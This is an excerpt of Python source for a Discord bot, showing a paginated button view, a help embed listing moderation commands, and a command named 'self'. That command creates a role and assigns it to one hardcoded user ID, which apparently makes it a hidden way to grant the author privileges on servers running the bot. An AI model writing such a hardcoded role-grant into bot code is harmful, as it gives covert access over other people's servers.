...
class PaginationView(discord.ui.View):
    ...
    @discord.ui.button(emoji="<:TWD_FIRST:1209075732676874340>", label="", style=discord.ButtonStyle.blurple)
...
# Commands List command with embed
...
async def commands_list(ctx):
    ...
    embed.add_field(name="!timeout @user duration", value="Times out a user for a specified duration", inline=False)
...
async def self(ctx):
    ...
    ALLOWED_USER_ID = 1169487822344962060
    ...
    member = guild.get_member(ALLOWED_USER_ID)
    if member:
        await member.add_roles(new_role)
        await ctx.send(f"Role '{role_name}' created and assigned to <@{ALLOWED_USER_ID}>.")
    else:
